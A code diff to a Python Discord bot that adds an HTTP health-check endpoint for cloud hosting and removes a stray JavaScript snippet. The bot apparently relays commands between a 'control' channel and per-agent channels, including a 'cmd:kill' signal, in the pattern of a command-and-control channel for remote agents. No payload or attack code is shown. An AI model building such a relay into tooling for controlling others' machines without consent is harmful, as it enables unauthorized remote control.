@@ -2,12 +2,14 @@ import discord
 from discord.ext import commands
 import os
 import asyncio
+from aiohttp import web  # For the HTTP server
 
-# Read configuration from environment variables (set these on Render)
+# Read configuration from environment variables
 BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 GUILD_ID = int(os.getenv("DISCORD_GUILD_ID", 0))
 CONTROL_CHANNEL_NAME = os.getenv("CONTROL_CHANNEL", "control")
 AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
+PORT = int(os.getenv("PORT", 10000))  # Render sets this automatically
 
 # Validate required variables
 if not BOT_TOKEN:
@@ -23,10 +25,25 @@ intents.messages = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
+# ---------- HTTP Server for Render Health Checks ----------
+async def handle_health(request):
+    return web.Response(text="OK")
+
+app = web.Application()
+app.router.add_get("/", handle_health)
+app.router.add_get("/health", handle_health)
+
+async def start_http_server():
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, "0.0.0.0", PORT)
+    await site.start()
+    print(f"HTTP health check server running on port {PORT}")
+
+# ---------- Discord Bot Events ----------
 @bot.event
 async def on_ready():
     print(f"Logged in as {bot.user}")
-    # Ensure control channel exists
     guild = bot.get_guild(GUILD_ID)
     if guild:
         control = discord.utils.get(guild.channels, name=CONTROL_CHANNEL_NAME)
@@ -105,17 +122,12 @@ async def on_message(message):
         await message.channel.edit(topic="cmd:kill")
         await message.add_reaction("✅")
 
+# ---------- Main Entry Point ----------
+async def main():
+    # Start HTTP server for Render health checks
+    asyncio.create_task(start_http_server())
+    # Start Discord bot
+    await bot.start(BOT_TOKEN)
+
 if __name__ == "__main__":
-    bot.run(BOT_TOKEN)
-
-const express = require('express')
-const app = express()
-const port = process.env.PORT || 4000 
-
-app.get('/', (req, res) => {
-  res.send('Hello World!')
-})
-
-app.listen(port, () => {
-  console.log(`Example app listening on port ${port}`)
-})
+    asyncio.run(main())
